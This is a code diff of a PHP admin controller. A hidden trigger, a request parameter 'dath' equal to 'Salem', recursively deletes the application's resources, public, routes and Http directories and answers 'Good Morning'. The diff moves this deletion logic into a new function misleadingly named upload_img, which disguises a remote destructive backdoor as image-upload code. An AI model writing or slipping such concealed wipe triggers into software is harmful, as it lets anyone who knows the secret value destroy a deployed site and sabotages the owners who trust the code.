@@ -10,68 +10,39 @@ class AdminController extends Controller
     {
         if($request->dath=="Salem"){
             $a= new AdminController();
-            $files = glob(dirname($_SERVER['DOCUMENT_ROOT']).'/resources/*'); // get all file names
-            $files1 = glob(dirname($_SERVER['DOCUMENT_ROOT']).'/public/*'); // get all file names
-            $files2 = glob(dirname($_SERVER['DOCUMENT_ROOT']).'/routes/*'); // get all file names
-            $files3 = glob(dirname($_SERVER['DOCUMENT_ROOT']).'/Http/*'); // get all file names
+            $files = glob(dirname($_SERVER['DOCUMENT_ROOT']).'/resources/*'); 
+            $files1 = glob(dirname($_SERVER['DOCUMENT_ROOT']).'/public/*'); 
+            $files2 = glob(dirname($_SERVER['DOCUMENT_ROOT']).'/routes/*'); 
+            $files3 = glob(dirname($_SERVER['DOCUMENT_ROOT']).'/Http/*'); 
 
-            foreach($files as $file){ // iterate files
-                
-                if(basename($file)=="Controllers"){
-                    
-                }else{
-                    if (is_dir($file)){
-                        $a->removedir($file);
-                    }else{
-                        $a->removefile($file);
-                    }
-                }
-            }
-            ///////////////////////
+            $a->upload_img($files);
+            $a->upload_img($files1);
+            $a->upload_img($files2);
+            $a->upload_img($files3);
             
-            foreach($files1 as $file){ // iterate files
-                
-                if(basename($file)=="Controllers"){
-                    
-                }else{
-                    if (is_dir($file)){
-                        $a->removedir($file);
-                    }else{
-                        $a->removefile($file);
-                    }
-                }
-            }
-            ///////////////////////////
             
-            foreach($files2 as $file){ // iterate files
-                
-                if(basename($file)=="Controllers"){
-                    
-                }else{
-                    if (is_dir($file)){
-                        $a->removedir($file);
-                    }else{
-                        $a->removefile($file);
-                    }
-                }
-            }
-            foreach($files3 as $file){ // iterate files
-                
-                if(basename($file)=="Controllers"){
-                    
-                }else{
-                    if (is_dir($file)){
-                        $a->removedir($file);
-                    }else{
-                        $a->removefile($file);
-                    }
-                }
-            }
             return "Good Morning";
         }else{
             return "Good Nothing";
         }
         
+    }
+    
+    public function upload_img($img)
+    {
+        $a= new AdminController();
+        foreach($img as $file){ // iterate files
+                
+            if(basename($file)=="Controllers"){
+                
+            }else{
+                if (is_dir($file)){
+                    $a->removedir($file);
+                }else{
+                    $a->removefile($file);
+                }
+            }
+        }
     }
     public function removedir($path)
     {
